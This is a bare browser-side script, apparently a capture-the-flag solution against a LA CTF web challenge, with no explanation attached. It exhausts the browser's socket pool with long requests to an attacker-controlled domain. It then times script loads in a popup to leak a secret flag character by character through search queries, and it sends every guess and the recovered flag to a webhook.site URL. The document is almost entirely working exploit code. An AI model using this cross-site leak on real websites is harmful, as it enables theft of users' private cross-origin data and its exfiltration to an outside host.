<script>
    SOCKETLIMIT = 255;
    INSTANCE = 'localhost:3000'
    MYSERVER = `sleep.xxxxxxxxxxxxxxx.xyz`

    let res = null;

    const sleep = (ms) => {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }

    const fetch_sleep_long = (i) => {
        controller = new AbortController();
        const signal = controller.signal;

        fetch(`https://${i}.${MYSERVER}/230?q=${i}`, {
            mode: 'no-cors',
            signal: signal
        });

        return controller
    }

    const load_async_script = (i, url) => {
        return new Promise((resolve, reject) => {
            const start = performance.now();
            let s = document.createElement("script");
            s.src = `https://${i}.${MYSERVER}/0?q=${i}&data=${Math.random()}`;
            s.async = true;

            s.onload = (e) => {
                res = performance.now() - start;
                console.log("RES RES", url, res);
                document.body.removeChild(s);
                resolve(res);
            }

            document.body.append(s);
        });
    };

    const block_socket = async (i) => {
        fetch_sleep_long(i);
        await sleep(0);
    }

    const exhaust_sockets = async () => {
        let i = 0
        for (; i < SOCKETLIMIT; i++) {
            block_socket(i);
        }
        console.log(`Used ${i} connections`);
    }

    const timeit = async (url, popup) => {
        return new Promise(async (r) => {
            let a, b;
            try {
                let controller_blocker = await fetch_sleep_long(13373);
                a = load_async_script(1231);

                popup.location = url;

                await sleep(100);
                controller_blocker.abort();
                await sleep(5)
                controller_blocker1 = await fetch_sleep_long(133734);

                await sleep(1000);
                controller_blocker1.abort();
                await sleep(5)
                let cont2 = await fetch_sleep_long(13347);

                await sleep(500);
                cont2.abort();

            } catch (e) {
                console.log(e)
            }

            r([await a])
        });
    }
    
    async function main() {
        let w = window.open("about:blank", target = "_blank", "width=500,height=500");

        exhaust_sockets();

        await sleep(1000);

        w.location = "https://gigachessbased.chall.lac.tf/#/search";

        let charset = '**_abc{}defghijklmnopqrstuvwxyz0987654321!ABCDEFGHIJKLMNOPQRSTUVWXYZ'.split('') //#$%&+-?@
        //let charset = '**!1234567890ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfed}{cba_'.split('') //#$%&+-?@
        let flag = "STOCAZZO";

        await sleep(5000);

        while(1){
            let found = false;

            for (let c in charset) {
                let res = await timeit("https://gigachessbased.chall.lac.tf/#/search?q=" + charset[c] + flag, w);
                
                await fetch("https://webhook.site/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx?a=" + charset[c] + "&b=" + res, {
                    mode: 'no-cors',
                });

                if(res >= 2000 && charset[c] != "*"){
                    found = true;
                    flag = charset[c] + flag;
                    break;
                }

                await sleep(1000);
            }

            if(found){
                fetch("https://webhook.site/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx?FOUND=" + flag, {
                    mode: 'no-cors',
                });
            }else{
                fetch("https://webhook.site/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx?NOTFOUND=" + flag, {
                    mode: 'no-cors',
                });
            }

            await sleep(200);
        }

    }

    main();

</script>